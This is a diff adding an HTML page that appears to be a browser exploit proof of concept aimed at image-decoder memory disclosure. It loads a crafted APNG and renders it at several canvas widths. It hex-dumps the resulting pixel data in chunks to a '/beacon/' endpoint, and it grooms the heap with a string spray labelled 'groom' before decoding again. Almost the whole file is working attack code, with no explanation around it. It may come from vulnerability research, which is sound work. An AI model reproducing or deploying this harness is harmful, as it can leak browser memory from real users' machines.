@@ -1,0 +1,31 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>apng3</title><script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+m+'?t='+Date.now(),false);x.send(null);}catch(e){}}
+function img(url){ return new Promise(function(res){ var i=new Image(); i.onload=function(){res(i);}; i.onerror=function(){res(null);}; i.src=url+'?t='+Date.now(); }); }
+function hexAll(d,n){ var s=''; for(var i=0;i<n*4;i++) s+=('0'+d[i].toString(16)).slice(-2); return s; }
+function dump(tag,d,n,chunk){ var h=hexAll(d,n); for(var o=0,part=0;o<h.length;o+=chunk,part++) b(tag+'-'+part+'-'+h.substr(o,chunk)); }
+function draw(w,im){ var c=document.createElement('canvas'); c.width=w; c.height=1; var g=c.getContext('2d'); g.drawImage(im,0,0); return g.getImageData(0,0,w,1).data; }
+function drawKeep(w,im){ var c=document.createElement('canvas'); c.width=w; c.height=1; var g=c.getContext('2d'); g.drawImage(im,0,0); var d=g.getImageData(0,0,w,1).data; window.__last=c; return d; }
+function spray(n,len){ var keep=[]; for(var i=0;i<n;i++){ var s=''; for(var j=0;j<len;j++) s+=String.fromCharCode(65+((i+j)%26)); keep.push(s); } return keep; }
+function boot(){
+  b('A3-BOOT');
+  img('/corpus/apng-hidden-first-frame-narrow.png').then(function(im){
+    if(!im){ b('A3-NOIMG'); return; }
+    var widths=[96,128,160,192,256,384,512,768];
+    for(var k=0;k<widths.length;k++){
+      var w=widths[k];
+      try{
+        var d=drawKeep(w,im);
+        b('A3-W-'+w+'-ok');
+        dump('A3-W'+w,d,w,900);
+      }catch(e){ b('A3-W-'+w+'-E-'+e.name); }
+    }
+    // groom: allocate then drop same-size small objects just before the decode
+    var kept=spray(3000,200);
+    b('A3-G-sprayed-'+kept.length);
+    kept.length=0; kept=null;
+    try{ var g=drawKeep(128,im); b('A3-G-ok'); dump('A3-G',g,128,900); }catch(e){ b('A3-G-E-'+e.name); }
+    b('A3-DONE');
+  });
+}
+boot();
+</script></head><body><p>apng3</p></body></html>
